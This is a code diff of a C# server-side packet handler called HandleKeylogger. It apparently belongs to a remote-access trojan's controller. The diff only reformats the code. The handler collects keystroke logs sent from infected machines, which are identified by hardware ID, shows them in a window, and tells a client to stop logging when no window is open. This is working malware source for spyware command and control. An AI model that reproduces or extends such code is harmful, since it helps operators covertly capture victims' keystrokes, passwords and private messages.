@@ -1,21 +1,18 @@
-﻿using Server.Forms;
-using Server.MessagePack;
+﻿using System.Windows.Forms;
 using Server.Connection;
-using System;
-using System.Diagnostics;
-using System.Drawing;
-using System.IO;
-using System.Windows.Forms;
+using Server.Forms;
+using Server.MessagePack;
 
 namespace Server.Handle_Packet
 {
-    class HandleKeylogger
+    internal class HandleKeylogger
     {
         public HandleKeylogger(Clients client, MsgPack unpack_msgpack)
         {
             try
             {
-                FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + unpack_msgpack.ForcePathObject("Hwid").GetAsString()];
+                var KL = (FormKeylogger)Application.OpenForms[
+                    "keyLogger:" + unpack_msgpack.ForcePathObject("Hwid").GetAsString()];
                 if (KL != null)
                 {
                     if (KL.Client == null)
@@ -23,6 +20,7 @@ namespace Server.Handle_Packet
                         KL.Client = client;
                         KL.timer1.Enabled = true;
                     }
+
                     KL.Sb.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
                     KL.richTextBox1.Text = KL.Sb.ToString();
                     KL.richTextBox1.SelectionStart = KL.richTextBox1.TextLength;
@@ -30,13 +28,15 @@ namespace Server.Handle_Packet
                 }
                 else
                 {
-                    MsgPack msgpack = new MsgPack();
+                    var msgpack = new MsgPack();
                     msgpack.ForcePathObject("Pac_ket").AsString = "keyLogger";
                     msgpack.ForcePathObject("isON").AsString = "false";
                     client.Send(msgpack.Encode2Bytes());
                 }
             }
-            catch { }
+            catch
+            {
+            }
         }
     }
 }
